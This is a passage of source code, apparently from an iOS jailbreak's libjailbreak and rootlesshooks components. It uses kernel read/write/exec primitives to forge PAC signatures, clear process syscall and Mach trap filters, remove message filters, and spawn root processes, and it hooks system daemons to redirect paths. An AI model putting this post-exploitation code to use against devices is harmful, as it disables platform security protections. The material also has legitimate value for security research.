	uint64_t map = kread_ptr(task + koffsetof(task, map));
	uint64_t pmap = kread_ptr(map + koffsetof(vm_map, pmap));
	return pmap_find_main_binary_code_dir(pmap);
}

uint32_t pmap_cs_trust_string_to_int(const char *trustString)
{
	int trustInt = 0;
	if (__builtin_available(iOS 16.0, *)) {
		if      (!strcmp(trustString, "PMAP_CS_UNTRUSTED"))             trustInt = 0;
		else if (!strcmp(trustString, "PMAP_CS_RETIRED"))               trustInt = 1;
		else if (!strcmp(trustString, "PMAP_CS_PROFILE_PREFLIGHT"))     trustInt = 2;
		else if (!strcmp(trustString, "PMAP_CS_COMPILATION_SERVICE"))   trustInt = 3;
		else if (!strcmp(trustString, "PMAP_CS_OOP_JIT"))               trustInt = 4;
		else if (!strcmp(trustString, "PMAP_CS_LOCAL_SIGNING"))         trustInt = 5;
		else if (!strcmp(trustString, "PMAP_CS_PROFILE_VALIDATED"))     trustInt = 6;
		else if (!strcmp(trustString, "PMAP_CS_APP_STORE"))             trustInt = 7;
		else if (!strcmp(trustString, "PMAP_CS_IN_LOADED_TRUST_CACHE")) trustInt = 8;
		else if (!strcmp(trustString, "PMAP_CS_IN_STATIC_TRUST_CACHE")) trustInt = 9;
	}
	else {
		if      (!strcmp(trustString, "PMAP_CS_UNTRUSTED"))             trustInt = 0;
		else if (!strcmp(trustString, "PMAP_CS_RETIRED"))               trustInt = 1;
		else if (!strcmp(trustString, "PMAP_CS_PROFILE_PREFLIGHT"))     trustInt = 2;
		else if (!strcmp(trustString, "PMAP_CS_COMPILATION_SERVICE"))   trustInt = 3;
		else if (!strcmp(trustString, "PMAP_CS_LOCAL_SIGNING"))         trustInt = 4;
		else if (!strcmp(trustString, "PMAP_CS_PROFILE_VALIDATED"))     trustInt = 5;
		else if (!strcmp(trustString, "PMAP_CS_APP_STORE"))             trustInt = 6;
		else if (!strcmp(trustString, "PMAP_CS_IN_LOADED_TRUST_CACHE")) trustInt = 7;
		else if (!strcmp(trustString, "PMAP_CS_IN_STATIC_TRUST_CACHE")) trustInt = 8;
	}
	return trustInt;
}

#endif

int sign_kernel_thread(uint64_t proc, mach_port_t threadPort)
{
	uint64_t threadKobj = task_get_ipc_port_kobject(proc_task(proc), threadPort);
	uint64_t threadContext = kread_ptr(threadKobj + koffsetof(thread, machine_contextData));

	uint64_t pc   = kread64(threadContext + offsetof(kRegisterState, pc));
	uint64_t cpsr = kread64(threadContext + offsetof(kRegisterState, cpsr));
	uint64_t lr   = kread64(threadContext + offsetof(kRegisterState, lr));
	uint64_t x16  = kread64(threadContext + offsetof(kRegisterState, x[16]));
	uint64_t x17  = kread64(threadContext + offsetof(kRegisterState, x[17]));

	return kcall(NULL, ksymbol(ml_sign_thread_state), 6, (uint64_t[]){ threadContext, pc, cpsr, lr, x16, x17 });
}

uint64_t kpacda(uint64_t pointer, uint64_t modifier)
{
	if (gPrimitives.kexec && kgadget(pacda)) {
		// |------- GADGET -------|
		// | cmp x1, #0		      |
		// | pacda x1, x9         |
		// | str x9, [x8]         |
		// | csel x9, xzr, x1, eq |
		// | ret                  |
		// |----------------------|
		uint64_t output = 0;
		uint64_t output_kernelVA = phystokv(vtophys(kread_ptr(pmap_self() + koffsetof(pmap, ttep)), (uint64_t)&output));
		kRegisterState threadState = { 0 };
		threadState.pc = kgadget(pacda);
		threadState.x[1] = pointer;
		threadState.x[9] = modifier;
		threadState.x[8] = output_kernelVA;
		kexec(&threadState);
		return output;
	}
	return 0;
}

uint64_t kptr_sign(uint64_t kaddr, uint64_t pointer, uint16_t salt)
{
	uint64_t modifier = (kaddr & 0xffffffffffff) | ((uint64_t)salt << 48);
	return kpacda(UNSIGN_PTR(pointer), modifier);
}

int kwrite1_bits(uint64_t startPtr, uint32_t bitCount)
{
	uint32_t byteSize = ceil((float)bitCount / 8);
	uint8_t buf[byteSize];

	for (uint32_t i = 0; i < bitCount; i += 8) {
		uint32_t rem = (bitCount - i);
		if (rem < 8) {
			for (int y = 0; y < rem; y++) {
				buf[i/8] |= (1 << y);
			}
		}
		else {
			buf[i/8] = 0xff;
		}
	}

	return kwritebuf(startPtr, buf, byteSize);
}

void proc_allow_all_syscalls(uint64_t proc)
{
	if (!gSystemInfo.kernelStruct.proc_ro.exists) return;
	uint64_t proc_ro = kread_ptr(proc + koffsetof(proc, proc_ro));

	uint64_t bsdFilter = kread_ptr(proc_ro + koffsetof(proc_ro, syscall_filter_mask));
	uint64_t machFilter = kread_ptr(proc_ro + koffsetof(proc_ro, mach_trap_filter_mask));
	uint64_t machKobjFilter = kread_ptr(proc_ro + koffsetof(proc_ro, mach_kobj_filter_mask));

	if (bsdFilter) {
		kwrite1_bits(bsdFilter, kconstant(nsysent));
	}
	if (machFilter) {
		kwrite1_bits(machFilter, kconstant(mach_trap_count));
	}
	if (machKobjFilter) {
		kwrite1_bits(machKobjFilter, kread64(ksymbol(mach_kobj_count)));
	}
}

void proc_remove_msg_filter(uint64_t proc)
{
	if (__builtin_available(iOS 16.0, *)) {
		#define TFRO_FILTER_MSG                 0x00004000

		if (koffsetof(proc_ro, t_flags_ro)) {
			// iOS 16.1+
			uint64_t proc_ro = kread_ptr(proc + koffsetof(proc, proc_ro));
			uint32_t t_flags = kread32(proc_ro + koffsetof(proc_ro, t_flags_ro));
			kwrite32(proc_ro + koffsetof(proc_ro, t_flags_ro), t_flags & ~TFRO_FILTER_MSG);
		}
		else if (koffsetof(task, flags)) {
			// iOS 16.0.x
			uint64_t task = proc_task(proc);
			uint32_t t_flags = kread32(task + koffsetof(task, flags));
			kwrite32(task + koffsetof(task, flags), t_flags & ~TFRO_FILTER_MSG);
		}
	}
}

int cmd_wait_for_exit(pid_t pid)
{
	int status = 0;
	do {
		if (waitpid(pid, &status, 0) == -1) {
			return -1;
		}
	} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	return status;
}

int __exec_cmd_internal_va(bool suspended, bool root, bool waitForExit, pid_t *pidOut, const char *binary, int argc, va_list va_args, char **envp)
{
	const char *argv[argc+1];
	argv[0] = binary;
	for (int i = 1; i < argc; i++) {
		argv[i] = va_arg(va_args, const char *);
	}
	argv[argc] = NULL;

	posix_spawnattr_t attr = NULL;
	posix_spawnattr_init(&attr);
	if (suspended) {
		posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED);
	}
	if (root) {
		posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
		posix_spawnattr_set_persona_uid_np(&attr, 0);
		posix_spawnattr_set_persona_gid_np(&attr, 0);
	}

	char **envToUse = envp;
	if (!envToUse && getpid() != 1) {
		// We NEVER want to pass launchd's environment to any process whatsoever
		// This is because, amongst other things, it has DYLD_INSERT_LIBRARIES set to launchdhook which is NO good
		envToUse = environ;
	}

	pid_t spawnedPid = 0;
	int spawnError = posix_spawn(&spawnedPid, binary, NULL, &attr, (char *const *)argv, envToUse);
	if (attr) posix_spawnattr_destroy(&attr);
	if (spawnError != 0) return spawnError;

	if (waitForExit && !suspended) {
		return cmd_wait_for_exit(spawnedPid);
	}
	else if (pidOut) {
		*pidOut = spawnedPid;
	}
	return 0;
}

int exec_cmd(const char *binary, ...)
{
	int argc = 1;
	va_list args;
	va_start(args, binary);
	while (va_arg(args, const char *)) argc++;
	va_end(args);

	va_start(args, binary);
	int r = __exec_cmd_internal_va(false, false, true, NULL, binary, argc, args, NULL);
	va_end(args);
	return r;
}

int exec_cmd_nowait(pid_t *pidOut, const char *binary, ...)
{
	int argc = 1;
	va_list args;
	va_start(args, binary);
	while (va_arg(args, const char *)) argc++;
	va_end(args);

	va_start(args, binary);
	int r = __exec_cmd_internal_va(false, false, false, pidOut, binary, argc, args, NULL);
	va_end(args);
	return r;
}

int exec_cmd_suspended(pid_t *pidOut, const char *binary, ...)
{
	int argc = 1;
	va_list args;
	va_start(args, binary);
	while (va_arg(args, const char *)) argc++;
	va_end(args);

	va_start(args, binary);
	int r = __exec_cmd_internal_va(true, false, false, pidOut, binary, argc, args, NULL);
	va_end(args);
	return r;
}

int exec_cmd_root(const char *binary, ...)
{
	int argc = 1;
	va_list args;
	va_start(args, binary);
	while (va_arg(args, const char *)) argc++;
	va_end(args);

	va_start(args, binary);
	int r = __exec_cmd_internal_va(false, true, true, NULL, binary, argc, args, NULL);
	va_end(args);
	return r;
}

int exec_cmd_env(char **envp, const char *binary, ...)
{
	int argc = 1;
	va_list args;
	va_start(args, binary);
	while (va_arg(args, const char *)) argc++;
	va_end(args);

	va_start(args, binary);
	int r = __exec_cmd_internal_va(false, false, true, NULL, binary, argc, args, envp);
	va_end(args);
	return r;
}

int jbctl_earlyboot(mach_port_t earlyBootServer, ...)
{
	int argc = 2;
	va_list args;
	va_start(args, earlyBootServer);
	while (va_arg(args, const char *)) argc++;
	va_end(args);

	const char *jbctlPath = JBROOT_PATH("/basebin/jbctl");
	const char *argsArr[argc+1];
	argsArr[0] = jbctlPath;
	va_start(args, earlyBootServer);
	for (int i = 1; i < argc-1; i++) {
		argsArr[i] = va_arg(args, const char *);
	}
	argsArr[argc-1] = "earlyboot";
	argsArr[argc] = NULL;

	posix_spawnattr_t attr;
	posix_spawnattr_init(&attr);
	posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){earlyBootServer, MACH_PORT_NULL, MACH_PORT_NULL}, 3);
	pid_t spawnedPid = 0;
	int r = posix_spawn(&spawnedPid, jbctlPath, NULL, &attr, (char *const *)argsArr, NULL);
	posix_spawnattr_destroy(&attr);
	if (r != 0) return r;
	return cmd_wait_for_exit(spawnedPid);
}

void killall(const char *executablePath, int signal)
{
	static int maxArgumentSize = 0;
	if (maxArgumentSize == 0) {
		size_t size = sizeof(maxArgumentSize);
		if (sysctl((int[]){ CTL_KERN, KERN_ARGMAX }, 2, &maxArgumentSize, &size, NULL, 0) == -1) {
			perror("sysctl argument size");
			maxArgumentSize = 4096; // Default
		}
	}
	int mib[3] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL};
	struct kinfo_proc *info;
	size_t length;
	int count;
	
	if (sysctl(mib, 3, NULL, &length, NULL, 0) < 0)
		return;
	if (!(info = malloc(length)))
		return;
	if (sysctl(mib, 3, info, &length, NULL, 0) < 0) {
		free(info);
		return;
	}
	count = length / sizeof(struct kinfo_proc);
	for (int i = 0; i < count; i++) {
		pid_t pid = info[i].kp_proc.p_pid;
		if (pid == 0) {
			continue;
		}
		size_t size = maxArgumentSize;
		char* buffer = (char *)malloc(length);
		if (sysctl((int[]){ CTL_KERN, KERN_PROCARGS2, pid }, 3, buffer, &size, NULL, 0) == 0) {
			char *cExecutablePath = buffer + sizeof(int);
			if (strcmp(cExecutablePath, executablePath) == 0) {
				kill(pid, signal);
			}
		}
		free(buffer);
	}
	free(info);
}

static int
copy_data(struct archive *ar, struct archive *aw)
{
	int r;
	const void *buff;
	size_t size;
	la_int64_t offset;

	for (;;) {
		r = archive_read_data_block(ar, &buff, &size, &offset);
		if (r == ARCHIVE_EOF)
			return (ARCHIVE_OK);
		if (r < ARCHIVE_OK)
			return (r);
		r = archive_write_data_block(aw, buff, size, offset);
		if (r < ARCHIVE_OK) {
			fprintf(stderr, "%s\n", archive_error_string(aw));
			return (r);
		}
	}
}

int libarchive_unarchive(const char *fileToExtract, const char *extractionPath)
{
	struct archive *a;
	struct archive *ext;
	struct archive_entry *entry;
	int flags;
	int r;

	/* Select which attributes we want to restore. */
	flags = ARCHIVE_EXTRACT_TIME;
	flags |= ARCHIVE_EXTRACT_PERM;
	flags |= ARCHIVE_EXTRACT_ACL;
	flags |= ARCHIVE_EXTRACT_FFLAGS;
	flags |= ARCHIVE_EXTRACT_OWNER;

	a = archive_read_new();
	archive_read_support_format_all(a);
	archive_read_support_filter_all(a);
	ext = archive_write_disk_new();
	archive_write_disk_set_options(ext, flags);
	archive_write_disk_set_standard_lookup(ext);
	if ((r = archive_read_open_filename(a, fileToExtract, 10240)))
			return 1;
	for (;;) {
			r = archive_read_next_header(a, &entry);
			if (r == ARCHIVE_EOF)
					break;
			if (r < ARCHIVE_OK)
					fprintf(stderr, "%s\n", archive_error_string(a));
			if (r < ARCHIVE_WARN)
					return 1;

			const char *currentFile = archive_entry_pathname(entry);
			char outputPath[PATH_MAX];
			strlcpy(outputPath, extractionPath, PATH_MAX);
			strlcat(outputPath, "/", PATH_MAX);
			strlcat(outputPath, currentFile, PATH_MAX);

			archive_entry_set_pathname(entry, outputPath);
			
			r = archive_write_header(ext, entry);
			if (r < ARCHIVE_OK)
					fprintf(stderr, "%s\n", archive_error_string(ext));
			else if (archive_entry_size(entry) > 0) {
					r = copy_data(a, ext);
					if (r < ARCHIVE_OK)
							fprintf(stderr, "%s\n", archive_error_string(ext));
					if (r < ARCHIVE_WARN)
							return 1;
			}
			r = archive_write_finish_entry(ext);
			if (r < ARCHIVE_OK)
					fprintf(stderr, "%s\n", archive_error_string(ext));
			if (r < ARCHIVE_WARN)
					return 1;
	}
	archive_read_close(a);
	archive_read_free(a);
	archive_write_close(ext);
	archive_write_free(ext);
	
	return 0;
}


// code from ktrw by Brandon Azad : https://github.com/googleprojectzero/ktrw
// A worker thread for activity_thread that just spins.
static void* worker_thread(void *arg)
{
	uint64_t end = *(uint64_t *)arg;
	for (;;) {
		close(-1);
		uint64_t now = mach_absolute_time();
		if (now >= end) {
			break;
		}
	}
	return NULL;
}

// A thread to alternately spin and sleep.
#define ACTIVITY_WORKER_COUNT 10
static void* activity_thread(void *arg)
{
	volatile uint64_t *runCount = arg;
	struct mach_timebase_info tb;
	mach_timebase_info(&tb);
	const unsigned milliseconds = 40;
	while (*runCount != 0) {
		// Spin for one period on multiple threads.
		uint64_t start = mach_absolute_time();
		uint64_t end = start + milliseconds * 1000 * 1000 * tb.denom / tb.numer;
		pthread_t worker[ACTIVITY_WORKER_COUNT];
		for (unsigned i = 0; i < ACTIVITY_WORKER_COUNT; i++) {
			pthread_create(&worker[i], NULL, worker_thread, &end);
		}
		worker_thread(&end);
		for (unsigned i = 0; i < ACTIVITY_WORKER_COUNT; i++) {
			pthread_join(worker[i], NULL);
		}
		// Sleep for one period.
		usleep(milliseconds * 1000);
	}
	return NULL;
}

static uint64_t gCaffeinateThreadRunCount = 0;
static pthread_t gCaffeinateThread = NULL;

void thread_caffeinate_start(void)
{
	if (gCaffeinateThreadRunCount == UINT64_MAX) return;
	gCaffeinateThreadRunCount++;
	if (gCaffeinateThreadRunCount == 1) {
		pthread_create(&gCaffeinateThread, NULL, activity_thread, &gCaffeinateThreadRunCount);
	}
}

void thread_caffeinate_stop(void)
{
	if (gCaffeinateThreadRunCount == 0) return;
	gCaffeinateThreadRunCount--;
	if (gCaffeinateThreadRunCount == 0) {
		pthread_join(gCaffeinateThread, NULL);
	}
}

void convert_data_to_hex_string(const void *data, size_t size, char *outBuf)
{
	unsigned char *pin = (unsigned char *)data;
	const char *hex = "0123456789ABCDEF";
	char *pout = outBuf;
	for(; pin < ((unsigned char *)data)+size; pout+=2, pin++){
		pout[0] = hex[(*pin>>4) & 0xF];
		pout[1] = hex[ *pin     & 0xF];
	}
	pout[0] = 0;
}

int convert_hex_string_to_data(const char *string, void *outBuf)
{
	size_t length = strlen(string);
	const char *pin = string;
	char *pout = outBuf;
	for (; pin < string+length; pin++) {
		char byte = *pin;
		if (byte >= '0' && byte <= '9') byte = byte - '0';
		else if (byte >= 'a' && byte <='f') byte = byte - 'a' + 10;
		else if (byte >= 'A' && byte <='F') byte = byte - 'A' + 10;
		else return -1;

		int shift = ((pin - (string+length)) % 2) ? 0 : 4;
		*pout = (*pout & ~(0xf << shift)) | (byte << shift);
		if (shift == 0) pout++;
	}
	return 0;
}

char *boot_manifest_hash(void)
{
	static char *gBuf = NULL;
	
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		io_registry_entry_t registryEntry = IORegistryEntryFromPath(kIOMainPortDefault, "IODeviceTree:/chosen");
		if (registryEntry) {
			CFDataRef bootManifestHashData = IORegistryEntryCreateCFProperty(registryEntry, CFSTR("boot-manifest-hash"), NULL, 0);
			CFIndex bootManifestHashLength = CFDataGetLength(bootManifestHashData);

			gBuf = malloc((bootManifestHashLength * 2 * sizeof(char)) + sizeof(char));
			unsigned char *buf = (unsigned char *)CFDataGetBytePtr(bootManifestHashData);
			convert_data_to_hex_string(buf, bootManifestHashLength, gBuf);

			CFRelease(bootManifestHashData);
		}
	});

	return gBuf;
}
```

`BaseBin/libjailbreak/src/util.h`:

```h
#ifndef LJB_UTIL_H
#define LJB_UTIL_H

#include "info.h"
#include "jbclient_xpc.h"
#include "jbroot.h"

#define min(a, b) (((a) < (b)) ? (a) : (b))
#define max(a, b) (((a) > (b)) ? (a) : (b))

const struct mach_header *get_mach_header(const char *name);
void proc_iterate(void (^itBlock)(uint64_t, bool*));

uint64_t proc_self(void);
uint64_t task_self(void);
uint64_t vm_map_self(void);
uint64_t pmap_self(void);
uint64_t ttep_self(void);
uint64_t tte_self(void);

uint64_t task_get_ipc_port_table_entry(uint64_t task, mach_port_t port);
uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port);
uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port);

uint64_t alloc_page_table_unassigned(void);
uint64_t pmap_alloc_page_table(uint64_t pmap, uint64_t va);
int pmap_expand_range(uint64_t pmap, uint64_t vaStart, uint64_t size);
int pmap_map_in(uint64_t pmap, uint64_t uaStart, uint64_t paStart, uint64_t size);

#ifdef __arm64e__
uint64_t pmap_find_main_binary_code_dir(uint64_t pmap);
uint64_t proc_find_main_binary_code_dir(uint64_t proc);
uint32_t pmap_cs_trust_string_to_int(const char *trustString);
#endif

int sign_kernel_thread(uint64_t proc, mach_port_t threadPort);
uint64_t kpacda(uint64_t pointer, uint64_t modifier);
uint64_t kptr_sign(uint64_t kaddr, uint64_t pointer, uint16_t salt);

void proc_allow_all_syscalls(uint64_t proc);
void proc_remove_msg_filter(uint64_t proc);

void killall(const char *executablePath, int signal);
int libarchive_unarchive(const char *fileToExtract, const char *extractionPath);

void thread_caffeinate_start(void);
void thread_caffeinate_stop(void);

void convert_data_to_hex_string(const void *data, size_t size, char *outBuf);
int convert_hex_string_to_data(const char *string, void *outBuf);

int cmd_wait_for_exit(pid_t pid);
int exec_cmd(const char *binary, ...);
int exec_cmd_nowait(pid_t *pidOut, const char *binary, ...);
int exec_cmd_suspended(pid_t *pidOut, const char *binary, ...);
int exec_cmd_root(const char *binary, ...);
int exec_cmd_env(char **envp, const char *binary, ...);

int jbctl_earlyboot(mach_port_t earlyBootServer, ...);

#define exec_cmd_trusted(x, args ...) ({ \
    jbclient_trust_file_by_path(x); \
    int retval; \
    retval = exec_cmd(x, args); \
    retval; \
})

char *boot_manifest_hash(void);

#define prebootUUIDPath(path) ({ \
	static char outPath[PATH_MAX]; \
	strlcpy(outPath, "/private/preboot/", PATH_MAX); \
	strlcat(outPath, boot_manifest_hash(), PATH_MAX); \
	strlcat(outPath, path, PATH_MAX); \
	(outPath); \
})

#define VM_FLAGS_GET_PROT(x)    ((x >>  7) & 0xFULL)
#define VM_FLAGS_GET_MAXPROT(x) ((x >> 11) & 0xFULL);
#define VM_FLAGS_SET_PROT(x, p)    x = ((x & ~(0xFULL <<  7)) | (((uint64_t)p) <<  7))
#define VM_FLAGS_SET_MAXPROT(x, p) x = ((x & ~(0xFULL << 11)) | (((uint64_t)p) << 11))

#ifdef __OBJC__
NSString *NSPrebootUUIDPath(NSString *relativePath);
#endif

void JBFixMobilePermissions(void);

#endif
```

`BaseBin/libjailbreak/src/util.m`:

```m
#include "info.h"
#import <Foundation/Foundation.h>
#import "util.h"
#import <sys/stat.h>

NSString *NSPrebootUUIDPath(NSString *relativePath)
{
	@autoreleasepool {
		return [NSString stringWithUTF8String:prebootUUIDPath(relativePath.UTF8String)];
	}
}

void _JBFixMobilePermissionsOfDirectory(NSString *directoryPath, BOOL recursive)
{
	struct stat s;
	NSURL *directoryURL = [NSURL fileURLWithPath:directoryPath];

	if (stat(directoryURL.fileSystemRepresentation, &s) == 0) {
		if (s.st_uid != 501 || s.st_gid != 501) {
			chown(directoryURL.fileSystemRepresentation, 501, 501);
		}
	}

	if (recursive) {
		NSDirectoryEnumerator *enumerator = [[NSFileManager defaultManager] enumeratorAtURL:directoryURL includingPropertiesForKeys:nil options:0 errorHandler:nil];
		for (NSURL *fileURL in enumerator) {
			if (stat(fileURL.fileSystemRepresentation, &s) == 0) {
				if (s.st_uid != 501 || s.st_gid != 501) {
					chown(fileURL.fileSystemRepresentation, 501, 501);
				}
			}
		}
	}
}

void JBFixMobilePermissions(void)
{
	@autoreleasepool {
		NSDictionary *attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:JBROOT_PATH(@"/var") error:nil];
		if ([attributes[NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
			// /var/jb/var is a symlink, abort
			return;
		}
		attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:JBROOT_PATH(@"/var/mobile") error:nil];
		if ([attributes[NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
			// /var/jb/var/mobile is a symlink, abort
			return;
		}

		_JBFixMobilePermissionsOfDirectory(JBROOT_PATH(@"/var/mobile"), NO);
		_JBFixMobilePermissionsOfDirectory(JBROOT_PATH(@"/var/mobile/Library"), NO);
		_JBFixMobilePermissionsOfDirectory(JBROOT_PATH(@"/var/mobile/Library/SplashBoard"), YES);
		_JBFixMobilePermissionsOfDirectory(JBROOT_PATH(@"/var/mobile/Library/Application Support"), YES);
		_JBFixMobilePermissionsOfDirectory(JBROOT_PATH(@"/var/mobile/Library/Preferences"), YES);
	}
}
```

`BaseBin/rootlesshooks/Makefile`:

```
TARGET := iphone:clang:latest:15.0
INSTALL_TARGET_PROCESSES = lsd cfprefsd
FINALPACKAGE = 1
THEOS_PACKAGE_SCHEME = rootless
ARCHS = arm64 arm64e

include $(THEOS)/makefiles/common.mk

TWEAK_NAME = rootlesshooks

rootlesshooks_FILES = $(wildcard *.x)
rootlesshooks_CFLAGS = -fobjc-arc -I../.include
rootlesshooks_LDFLAGS = -rpath @loader_path/fallback -L../libjailbreak -ljailbreak

include $(THEOS_MAKE_PATH)/tweak.mk

```

`BaseBin/rootlesshooks/SpringBoard.x`:

```x
#import <Foundation/Foundation.h>
#import <substrate.h>
#import <objc/objc.h>
#import <libroot.h>
#import <fcntl.h>

bool string_has_prefix(const char *str, const char* prefix)
{
	if (!str || !prefix) {
		return false;
	}

	size_t str_len = strlen(str);
	size_t prefix_len = strlen(prefix);

	if (str_len < prefix_len) {
		return false;
	}

	return !strncmp(str, prefix, prefix_len);
}

@interface XBSnapshotContainerIdentity : NSObject <NSCopying>
@property (nonatomic, readonly, copy) NSString* bundleIdentifier;
- (NSString*)snapshotContainerPath;
@end

%hook XBSnapshotContainerIdentity

- (NSString *)snapshotContainerPath
{
	NSString *path = %orig;
	if([path hasPrefix:@"/var/mobile/Library/SplashBoard/Snapshots/"] && ![self.bundleIdentifier hasPrefix:@"com.apple."]) {
		return JBROOT_PATH_NSSTRING(path);
	}
	return path;
}

%end

%hookf(int, fcntl, int fildes, int cmd, ...) {
	if (cmd == F_SETPROTECTIONCLASS) {
		char filePath[PATH_MAX];
		if (fcntl(fildes, F_GETPATH, filePath) != -1) {
			// Skip setting protection class on jailbreak apps, this doesn't work and causes snapshots to not be saved correctly
			if (string_has_prefix(filePath, JBROOT_PATH_CSTRING("/var/mobile/Library/SplashBoard/Snapshots"))) {
				return 0;
			}
		}
	}

	va_list a;
	va_start(a, cmd);
	const char *arg1 = va_arg(a, void *);
	const void *arg2 = va_arg(a, void *);
	const void *arg3 = va_arg(a, void *);
	const void *arg4 = va_arg(a, void *);
	const void *arg5 = va_arg(a, void *);
	const void *arg6 = va_arg(a, void *);
	const void *arg7 = va_arg(a, void *);
	const void *arg8 = va_arg(a, void *);
	const void *arg9 = va_arg(a, void *);
	const void *arg10 = va_arg(a, void *);
	va_end(a);
	return %orig(fildes, cmd, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10);
}

void springboardInit(void)
{
	%init();
}

```

`BaseBin/rootlesshooks/cfprefsd.x`:

```x
#import <Foundation/Foundation.h>
#import <substrate.h>

BOOL preferencePlistNeedsRedirection(NSString *plistPath)
{
	if ([plistPath hasPrefix:@"/private/var/mobile/Containers"] || [plistPath hasPrefix:@"/var/db"] || [plistPath hasPrefix:@"/var/jb"]) return NO;

	NSString *plistName = plistPath.lastPathComponent;

	if ([plistName hasPrefix:@"com.apple."] || [plistName hasPrefix:@"systemgroup.com.apple."] || [plistName hasPrefix:@"group.com.apple."]) return NO;

	NSArray *additionalSystemPlistNames = @[
		@".GlobalPreferences.plist",
		@".GlobalPreferences_m.plist",
		@"bluetoothaudiod.plist",
		@"NetworkInterfaces.plist",
		@"OSThermalStatus.plist",
		@"preferences.plist",
		@"osanalyticshelper.plist",
		@"UserEventAgent.plist",
		@"wifid.plist",
		@"dprivacyd.plist",
		@"silhouette.plist",
		@"nfcd.plist",
		@"kNPProgressTrackerDomain.plist",
		@"siriknowledged.plist",
		@"UITextInputContextIdentifiers.plist",
		@"mobile_storage_proxy.plist",
		@"splashboardd.plist",
		@"mobile_installation_proxy.plist",
		@"languageassetd.plist",
		@"ptpcamerad.plist",
		@"com.google.gmp.measurement.monitor.plist",
		@"com.google.gmp.measurement.plist",
	];

	return ![additionalSystemPlistNames containsObject:plistName];
}

%hookf(BOOL, _CFPrefsGetPathForTriplet, CFStringRef bundleIdentifier, CFStringRef user, BOOL byHost, CFStringRef path, UInt8 *buffer)
{
	BOOL orig = %orig(bundleIdentifier, user, byHost, path, buffer);

	if(orig && buffer && !access("/var/jb", F_OK))
	{
		NSString* origPath = [NSString stringWithUTF8String:(char*)buffer];
		BOOL needsRedirection = preferencePlistNeedsRedirection(origPath);
		if (needsRedirection) {
			//NSLog(@"Plist redirected to /var/jb: %@", origPath);
			strcpy((char*)buffer, "/var/jb");
			strcat((char*)buffer, origPath.UTF8String);
		}
	}

	return orig;
}

void cfprefsdInit(void)
{
	MSImageRef coreFoundationImage = MSGetImageByName("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation");
	if (coreFoundationImage) {
		%init(_CFPrefsGetPathForTriplet = MSFindSymbol(coreFoundationImage, "__CFPrefsGetPathForTriplet"));
	}
}
```

`BaseBin/rootlesshooks/installd.x`:

```x
#import <Foundation/Foundation.h>

// BOOTLOOP RISK, DO NOT TOUCH
/*%hook MIGlobalConfiguration

- (NSMutableDictionary *)_bundleIDMapForBundlesInDirectory:(NSURL *)directoryURL
											 withExtension:(NSString *)extension
									 loadingAdditionalKeys:(NSSet *)additionalKeys
{
	NSLog(@"_bundleIDMapForBundlesInDirectory(%@, %@, %@)", directoryURL, extension, additionalKeys);

	if ([directoryURL.path isEqualToString:@"/Applications"] && [extension isEqualToString:@"app"]) {
		NSMutableDictionary *origMap = %orig;

		NSURL *rootlessAppDir = [NSURL fileURLWithPath:@"/var/jb/Applications" isDirectory:YES];
		NSMutableDictionary *rootlessAppsMap = %orig(rootlessAppDir, extension, additionalKeys);
		[origMap addEntriesFromDictionary:rootlessAppsMap];
		return origMap;
	}

	return %orig;
}

%end*/

void installdInit(void)
{
	%init();
}

```

`BaseBin/rootlesshooks/lsd.x`:

```x
#import <Foundation/Foundation.h>
#import <libjailbreak/util.h>
#import <libroot.h>

%hookf(NSURL *, _LSGetInboxURLForBundleIdentifier, NSString *bundleIdentifier)
{
	NSURL *origURL = %orig;
	if (![bundleIdentifier hasPrefix:@"com.apple"] && [origURL.path hasPrefix:@"/var/mobile/Library/Application Support/Containers/"]) {
		return [NSURL fileURLWithPath:JBROOT_PATH_NSSTRING(origURL.path)];
	}
	return origURL;
}

%hookf(int, _LSServer_RebuildApplicationDatabases)
{
	int r = %orig;

	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
		// Ensure jailbreak apps are readded to icon cache after the system reloads it
		// A bit hacky, but works
		const char *uicachePath = JBROOT_PATH_CSTRING("/usr/bin/uicache");
		if (!access(uicachePath, F_OK)) {
			exec_cmd(uicachePath, "-a", NULL);
		}
	});

	return r;
}

void lsdInit(void)
{
	MSImageRef coreServicesImage = MSGetImageByName("/System/Library/Frameworks/CoreServices.framework/CoreServices");
	if (coreServicesImage) {
		%init(_LSGetInboxURLForBundleIdentifier = MSFindSymbol(coreServicesImage, "__LSGetInboxURLForBundleIdentifier"),
		  _LSServer_RebuildApplicationDatabases = MSFindSymbol(coreServicesImage, "__LSServer_RebuildApplicationDatabases"));
	}
}
```

`BaseBin/rootlesshooks/main.x`:

```x
#import <Foundation/Foundation.h>
#import <mach-o/dyld.h>

NSString* safe_getExecutablePath()
{
	char executablePathC[PATH_MAX];
	uint32_t executablePathCSize = sizeof(executablePathC);
	_NSGetExecutablePath(&executablePathC[0], &executablePathCSize);
	return [NSString stringWithUTF8String:executablePathC];
}

NSString* getProcessName()
{
	return safe_getExecutablePath().lastPathComponent;
}

%ctor
{
	NSString *processName = getProcessName();
	/*if ([processName isEqualToString:@"installd"]) {
		extern void installdInit(void);
		installdInit();
	}
	else*/ if ([processName isEqualToString:@"cfprefsd"]) {
		extern void cfprefsdInit(void);
		cfprefsdInit();
	}
	else if ([processName isEqualToString:@"SpringBoard"]) {
		extern void springboardInit(void);
		springboardInit();
	}
	else if ([processName isEqualToString:@"lsd"]) {
		extern void lsdInit(void);
		lsdInit();
	}
}
```

`BaseBin/systemhook/Makefile`:

```
TARGET = systemhook.dylib
CC = clang

